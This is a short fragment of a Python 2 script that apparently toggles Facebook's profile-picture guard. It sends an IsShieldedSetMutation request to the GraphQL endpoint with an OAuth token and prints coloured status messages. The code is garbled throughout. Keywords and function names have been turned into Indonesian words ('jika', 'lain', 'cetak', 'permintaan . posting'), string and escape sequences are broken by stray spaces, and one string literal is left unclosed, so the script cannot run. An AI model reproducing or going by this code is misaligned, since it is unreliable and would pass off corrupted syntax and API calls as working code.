    data  =  'variabel = {"0": {"is_shielded":% s, "session_id": "9b78191c-84fd-4ab6-b0aa-19b39f04a6bc", "aktor_id": "% s", "client_mutation_id": "b0316dd- 3fd6-4beb-aed4-bb29c5dc64b0" }} & metode = pos & doc_id = 1477043292367183 & QUERY_NAME = IsShieldedSetMutation & strip_defaults = true & strip_nulls = true & locale = en_US & client_country_code = US & fb_api_req_friendly_name = IsShieldedSetMutation & fb_api_caller_class = IsShieldedSetMutation'  % ( aktifkan , str ( id ))
    header  = { 'Jenis-Konten' : 'application / x-www-form-urlencoded' , 'Otorisasi' : 'OAuth% s'  %  toket }
    url  =  'https://graph.facebook.com/graphql'
    res  =  permintaan . posting ( url , data = data , header = header )
    print  res . teks
    jika  '"is_shielded": true'  di  res . teks :
        os . sistem ( 'jelas' )
        cetak  logo
        mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
        cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mActivated'
        raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
        lain ()
    lain :
        jika  '"is_shielded": false'  di  res . teks :
            os . sistem ( 'jelas' )
            cetak  logo
            mencetak  52  *  ' \ x1b [1; 97m \ XE2 \ x95 \ X90 '
            cetak  ' \ x1b [1; 91m [ \ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 91 diaktifkan]
            raw_input ( ' \ n \ x1b [1; 91m [ \ x1b [1; 97mBack \ x1b [1; 91m]' )
            lain ()
        lain :
            cetak  ' \ x1b [1; 91m [!] Kesalahan'
            keluar ()


if  __name__  ==  '__main__' :
	login ()
